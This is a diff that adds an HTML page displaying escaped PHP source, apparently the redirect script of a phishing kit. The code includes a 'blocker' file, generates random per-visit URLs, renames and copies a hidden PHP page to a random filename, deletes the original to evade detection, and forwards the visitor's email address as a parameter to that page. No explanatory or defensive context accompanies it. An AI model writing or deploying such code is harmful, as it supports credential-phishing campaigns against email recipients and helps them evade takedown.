@@ -1,0 +1,51 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title></title>
+</head>
+<body>
+&lt;?php<br/>
+<br/>
+include(&#39;blocker.php&#39;);<br/>
+<br/>
+function random_number(){<br/>
+&nbsp;&nbsp;&nbsp;$numbers=array(0,1,2,3,4,5,6,7,8,9,&#39;A&#39;,&#39;b&#39;,&#39;C&#39;,&#39;D&#39;,&#39;e&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;i&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;);<br/>
+&nbsp;&nbsp;&nbsp;$key=array_rand($numbers);<br/>
+&nbsp;&nbsp;&nbsp;return $numbers[$key]; }<br/>
+<br/>
+$url=random_number().random_number().random_number().random_number().random_number().random_number().date(&#39;U&#39;).md5(date(&#39;U&#39;)).md5(date(&#39;U&#39;)).md5(date(&#39;U&#39;)).md5(date(&#39;U&#39;)).md5(date(&#39;U&#39;));<br/>
+header(&#39;location:&#39;.$url);<br/>
+<br/>
+<br/>
+$email = $_GET[&#39;email&#39;];<br/>
+$dir =  getcwd();<br/>
+if ($handle = opendir($dir)) {<br/>
+    while (false !== ($entry = readdir($handle))) {<br/>
+ $len = strlen($entry);<br/>
+if($len == 28){<br/>
+rename($entry, &quot;wait.php&quot;);<br/>
+}}}<br/>
+$staticfile = &quot;wait.php&quot;;<br/>
+$name =  generateRandomString();<br/>
+$secfile = $name.&quot;.php&quot;;<br/>
+if (!copy($staticfile, $secfile)) {<br/>
+//echo &quot;file not create\n&quot;;<br/>
+}else {<br/>
+if(file_exists($secfile)){<br/>
+//echo &quot;file exist\n&quot;;<br/>
+unlink($staticfile);<br/>
+header(&quot;Location: $secfile?$url&amp;email=$email&quot;);<br/>
+}}<br/>
+<br/>
+//echo $_SESSION[&quot;file&quot;].&quot;\n&quot;;<br/>
+$name =  generateRandomString();<br/>
+function generateRandomString($length = 24) {<br/>
+    $characters = &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;;<br/>
+    $charactersLength = strlen($characters);<br/>
+    $randomString = &#39;&#39;;<br/>
+    for ($i = 0; $i &lt; $length; $i++) {<br/>
+        $randomString .= $characters[rand(0, $charactersLength &ndash; 1)];<br/>
+    }<br/>
+    return $randomString;<br/>
+}<br/>
+?&gt;</body></html>
